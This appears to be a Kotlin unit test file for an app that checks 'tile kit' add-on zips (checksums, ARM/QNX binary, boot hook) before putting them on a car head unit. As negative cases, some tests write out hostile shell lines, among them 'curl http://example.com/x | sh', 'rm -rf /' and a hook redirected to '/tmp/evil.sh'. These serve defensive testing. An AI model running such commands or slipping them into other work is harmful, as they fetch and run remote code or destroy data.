package com.nbtaad.editor.addon

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.ByteArrayOutputStream
import java.security.MessageDigest
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/** The tile kit: which files the app takes out of the zip, and what stops it from putting them on a head unit. */
class TileKitTest {
    private fun elf(type: Int = 2, machine: Int = 40, qnx: Boolean = true): ByteArray {
        val b = ByteArray(2200)
        b[0] = 0x7F; b[1] = 'E'.code.toByte(); b[2] = 'L'.code.toByte(); b[3] = 'F'.code.toByte()
        b[4] = 1; b[5] = 1; b[6] = 1
        b[16] = type.toByte(); b[18] = machine.toByte()
        if (qnx) "/usr/lib/ldqnx.so.2".toByteArray().copyInto(b, 300)
        return b
    }

    private val launcher = "#!/bin/sh\n# aa-tile-launcher.sh (nbt-aa-tile 5) - starts aa-tile at boot\n/opt/aa-tile/aa-tile follow &\n"
    private val hook = "# nbt-aa-tile hook - removed by remove-boot.sh\n" +
        "[ -f /opt/aa-tile/aa-tile-launcher.sh ] && /bin/sh /opt/aa-tile/aa-tile-launcher.sh </dev/null >/dev/null 2>&1 &\n"

    private fun files(mutate: (MutableMap<String, ByteArray>) -> Unit = {}): MutableMap<String, ByteArray> {
        val m = linkedMapOf(
            "aa-tile" to elf(),
            "aa-tile-launcher.sh" to launcher.toByteArray(),
            "hook.txt" to hook.toByteArray(),
        )
        mutate(m)
        return m
    }

    private fun sha(b: ByteArray) = MessageDigest.getInstance("SHA-256").digest(b).joinToString("") { "%02x".format(it.toInt() and 0xFF) }

    private fun zipOf(dir: String, m: Map<String, ByteArray>, extra: Map<String, ByteArray> = emptyMap()): ByteArray {
        val out = ByteArrayOutputStream()
        ZipOutputStream(out).use { z ->
            for ((n, d) in m + extra) { z.putNextEntry(ZipEntry(dir + n)); z.write(d); z.closeEntry() }
        }
        return out.toByteArray()
    }

    private fun sums(m: Map<String, ByteArray>) = m.entries.joinToString("") { "${sha(it.value)}  ${it.key}\n" }.toByteArray()

    @Test
    fun theThreeFilesAreTakenFromTheZipAndPass() {
        val m = files()
        val kit = TileKits.parse(zipOf("nbt-aa-tile/", m, mapOf("SHA256SUMS" to sums(m), "readme.md" to "hello".toByteArray(), "install-boot.sh" to "echo".toByteArray())))
        assertTrue(kit.problems.toString(), kit.ok)
        assertEquals(setOf("aa-tile", "aa-tile-launcher.sh", "hook.txt"), kit.files.keys)
        assertEquals("5", kit.version)
        assertEquals("nbt-aa-tile 5", kit.title)
        // not a build the app has the hashes of
        assertFalse(kit.known)
        assertTrue(kit.notes.any { it.contains("not identical") })
    }

    @Test
    fun theKnownBuildTableHasRealLookingHashes() {
        for ((_, h) in TileKits.KNOWN) for (x in listOf(h.first, h.second, h.third)) assertTrue(Regex("[0-9a-f]{64}").matches(x))
    }

    @Test
    fun aZipWithoutAChecksumListIsFineButSaysSo() {
        val kit = TileKits.parse(zipOf("", files()))
        assertTrue(kit.ok)
        assertTrue(kit.notes.any { it.contains("no SHA256SUMS") })
    }

    @Test
    fun aFileThatDoesNotMatchTheChecksumListStopsIt() {
        val m = files()
        val s = sums(m)
        m["aa-tile-launcher.sh"] = (launcher + "rm -rf /\n").toByteArray()
        val kit = TileKits.parse(zipOf("", m, mapOf("SHA256SUMS" to s)))
        assertFalse(kit.ok)
        assertTrue(kit.problems.any { it.contains("aa-tile-launcher.sh") && it.contains("SHA256SUMS") })
    }

    @Test
    fun theSizeFileIsChecked() {
        val kit = TileKits.parse(zipOf("", files(), mapOf("aa-tile.size" to "123\n".toByteArray())))
        assertFalse(kit.ok)
        assertTrue(kit.problems.any { it.contains("aa-tile.size") })
        assertTrue(TileKits.parse(zipOf("", files(), mapOf("aa-tile.size" to "2200\n".toByteArray()))).ok)
    }

    @Test
    fun aMissingFileIsSaid() {
        val kit = TileKits.parse(zipOf("", files { it.remove("hook.txt") }))
        assertFalse(kit.ok)
        assertTrue(kit.problems.any { it.contains("hook.txt is not in the zip") })
    }

    @Test
    fun theProgramMustBeAnArmProgramForQnx() {
        assertFalse(TileKits.of(files { it["aa-tile"] = elf(qnx = false) }).ok)
        assertFalse(TileKits.of(files { it["aa-tile"] = elf(machine = 62) }).ok)
        assertFalse(TileKits.of(files { it["aa-tile"] = "#!/bin/sh\necho hi\n".toByteArray() }).ok)
    }

    @Test
    fun theHookMayOnlyStartTheLauncher() {
        val extra = hook + "curl http://example.com/x | sh\n"
        assertFalse(TileKits.of(files { it["hook.txt"] = extra.toByteArray() }).ok)
        assertFalse(TileKits.of(files { it["hook.txt"] = hook.replace("/opt/aa-tile/aa-tile-launcher.sh </dev", "/tmp/evil.sh </dev").toByteArray() }).ok)
        assertFalse(TileKits.of(files { it["hook.txt"] = "# nothing to see\nrm -rf /opt\n".toByteArray() }).ok)
        // one command, but without the comment the removal finds its lines by
        assertFalse(TileKits.of(files { it["hook.txt"] = hook.lines()[1].plus("\n").toByteArray() }).ok)
        // the line after it would be joined to it
        assertFalse(TileKits.of(files { it["hook.txt"] = hook.trimEnd().toByteArray() }).ok)
        assertFalse(TileKits.of(files { it["hook.txt"] = ByteArray(0) }).ok)
        assertTrue(TileKits.of(files()).ok)
    }

    @Test
    fun theLauncherMustBeASmallShellScriptThatStartsTheTile() {
        assertFalse(TileKits.of(files { it["aa-tile-launcher.sh"] = "echo hi\n".toByteArray() }).ok)
        assertFalse(TileKits.of(files { it["aa-tile-launcher.sh"] = "#!/bin/sh\necho hi\n".toByteArray() }).ok)
        assertFalse(TileKits.of(files { it["aa-tile-launcher.sh"] = ByteArray(40_000) { 'a'.code.toByte() } }).ok)
    }

    @Test
    fun aFileTwiceInTheZipIsRefused() {
        val out = ByteArrayOutputStream()
        ZipOutputStream(out).use { z ->
            for ((n, d) in files()) { z.putNextEntry(ZipEntry(n)); z.write(d); z.closeEntry() }
            z.putNextEntry(ZipEntry("other/hook.txt")); z.write("# other\n".toByteArray()); z.closeEntry()
        }
        val kit = TileKits.parse(out.toByteArray())
        assertFalse(kit.ok)
        assertTrue(kit.problems.any { it.contains("more than once") })
    }

    @Test
    fun somethingThatIsNoZipGivesProblemsNotAnException() {
        val kit = TileKits.parse("this is not a zip at all".toByteArray())
        assertFalse(kit.ok)
        assertTrue(kit.problems.isNotEmpty())
    }

    @Test
    fun theTileIsRecognizedFromTheZipAndInstallable() {
        val m = files()
        val zip = zipOf("nbt-aa-tile/", m, mapOf("SHA256SUMS" to sums(m), "install-boot.sh" to "echo".toByteArray()))
        val r = AddOns.recognize(ZipSurvey.survey("tile.zip", zip), zip)
        assertEquals(Match.KNOWN_ADDON, r.match)
        assertTrue(r.problems.toString(), r.installable)
        assertTrue(r.appliesInApp)
        assertEquals("Installable now", r.headline)
        assertTrue(r.answer.startsWith("Yes"))
        assertEquals("nbt-aa-tile 5", AddOns.tileKitOf("tile.zip", zip)?.title)
    }

    @Test
    fun aTileZipWithAChangedHookIsNotInstallable() {
        val m = files { it["hook.txt"] = (hook + "echo hi > /tmp/x\n").toByteArray() }
        val zip = zipOf("", m)
        val r = AddOns.recognize(ZipSurvey.survey("tile.zip", zip), zip)
        assertEquals(Match.KNOWN_ADDON, r.match)
        assertFalse(r.installable)
        assertEquals("Cannot be installed", r.headline)
        assertTrue(r.answer.startsWith("No"))
        assertNull(AddOns.tileKitOf("tile.zip", zip))
    }

    @Test
    fun theDaemonVersionTheTileNeeds() {
        assertEquals(true, TileLogic.daemonEnough("v1.9.116"))
        assertEquals(true, TileLogic.daemonEnough("1.8.66"))
        assertEquals(false, TileLogic.daemonEnough("v1.8.65"))
        assertEquals(false, TileLogic.daemonEnough("v0.9.200"))
        assertEquals(true, TileLogic.daemonEnough("v2.0.0"))
        assertNull(TileLogic.daemonEnough(null))
        assertNull(TileLogic.daemonEnough("no version"))
    }
}
